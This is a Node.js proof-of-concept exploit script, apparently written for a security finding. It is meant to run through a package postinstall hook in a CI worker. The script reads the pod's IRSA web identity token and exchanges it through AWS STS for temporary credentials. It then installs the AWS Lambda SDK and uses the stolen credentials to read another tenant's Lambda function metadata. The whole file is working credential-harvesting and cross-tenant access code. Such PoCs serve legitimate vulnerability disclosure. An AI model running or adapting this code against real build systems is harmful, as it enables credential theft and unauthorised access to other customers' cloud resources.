const fs = require('fs');
const https = require('https');

function b64urlDecode(s) {
  return Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
}

console.log('=== POC: postinstall RCE + cross-tenant lambda:GetFunction ===\n');
console.log('1. Extracting IRSA identity...');
console.log('   AWS_ROLE_ARN =', process.env.AWS_ROLE_ARN);
console.log('   AWS_WEB_IDENTITY_TOKEN_FILE =', process.env.AWS_WEB_IDENTITY_TOKEN_FILE);

const tokenPath = process.env.AWS_WEB_IDENTITY_TOKEN_FILE;
if (!tokenPath || !fs.existsSync(tokenPath)) {
  console.log('   ERROR: No IRSA token file found\n');
  process.exit(1);
}

const token = fs.readFileSync(tokenPath, 'utf8').trim();
const payload = JSON.parse(b64urlDecode(token.split('.')[1]));
console.log('   ✓ Token subject:', payload.sub);
console.log('   ✓ Token audience:', Array.isArray(payload.aud) ? payload.aud[0] : payload.aud);

// Step 1: AssumeRoleWithWebIdentity to get temp credentials
console.log('\n2. Assuming cd-tekton-worker role via STS...');
const roleArn = process.env.AWS_ROLE_ARN;
const region = process.env.AWS_REGION || 'eu-central-1';
const stsParams = new URLSearchParams({
  Action: 'AssumeRoleWithWebIdentity',
  Version: '2011-06-15',
  RoleArn: roleArn,
  RoleSessionName: 'poc-session',
  WebIdentityToken: token,
}).toString();

https.get(`https://sts.${region}.amazonaws.com/?${stsParams}`, res => {
  let body = '';
  res.on('data', c => body += c);
  res.on('end', () => {
    try {
      const xml = body;
      const accessKeyMatch = xml.match(/<AccessKeyId>([^<]+)<\/AccessKeyId>/);
      const secretKeyMatch = xml.match(/<SecretAccessKey>([^<]+)<\/SecretAccessKey>/);
      const sessionTokenMatch = xml.match(/<SessionToken>([^<]+)<\/SessionToken>/);

      if (!accessKeyMatch || !secretKeyMatch || !sessionTokenMatch) {
        console.log('   ERROR: Failed to extract credentials from STS response');
        process.exit(1);
      }

      const creds = {
        accessKeyId: accessKeyMatch[1],
        secretAccessKey: secretKeyMatch[1],
        sessionToken: sessionTokenMatch[1],
      };
      console.log('   ✓ Got temporary credentials (AccessKeyId:', creds.accessKeyId.slice(0, 12) + '...)');

      // Step 2: Install AWS SDK and use it to call lambda:GetFunction on PROJECT B's function
      console.log('\n3. Installing AWS SDK for Lambda client...');
      const { exec } = require('child_process');
      exec('npm install --loglevel=error --prefix /tmp/lambda-sdk @aws-sdk/client-lambda@latest', (err, stdout, stderr) => {
        if (err) {
          console.log('   ERROR: Failed to install SDK:', err.message);
          process.exit(1);
        }
        console.log('   ✓ SDK installed');

        // Now use the SDK with the temp credentials
        console.log('\n4. Calling lambda:GetFunction on Project B\'s function (cross-tenant read)...');

        const { LambdaClient, GetFunctionCommand } = require('/tmp/lambda-sdk/node_modules/@aws-sdk/client-lambda');

        const client = new LambdaClient({
          region: region,
          credentials: {
            accessKeyId: creds.accessKeyId,
            secretAccessKey: creds.secretAccessKey,
            sessionToken: creds.sessionToken,
          },
        });

        // Project B subdomain: ffvuxtepyautytovdlnf
        // Function path: functions/hello.js
        // Function name = sha256(ffvuxtepyautytovdlnf + functions/hello.js)
        const projectBFunctionName = '423b2e9c64cc5ce6bbe1286baca4c10348cd4e71cde1339da07ad0869585e4d8';
        console.log('   Target function:', projectBFunctionName);
        console.log('   Region:', region);

        const command = new GetFunctionCommand({ FunctionName: projectBFunctionName });
        client.send(command)
          .then(response => {
            console.log('   ✓ SUCCESS: Read Project B\'s function metadata');
            console.log('     Function ARN:', response.Configuration.FunctionArn);
            console.log('     Function name:', response.Configuration.FunctionName);
            console.log('     Runtime:', response.Configuration.Runtime);
            console.log('     Last modified:', response.Configuration.LastModified);
            console.log('\n   ⚠️  FINDING 3 VERIFIED: Cross-tenant lambda:GetFunction succeeded!');
          })
          .catch(error => {
            console.log('   HTTP error:', error.message);
            if (error.$metadata?.httpStatusCode === 403) {
              console.log('   (403 Forbidden — function may not be deployed yet, or account mismatch)');
            }
          });
      });

    } catch (e) {
      console.log('   ERROR:', e.message);
      process.exit(1);
    }
  });
}).on('error', e => {
  console.log('   ERROR: STS call failed:', e.message);
  process.exit(1);
});
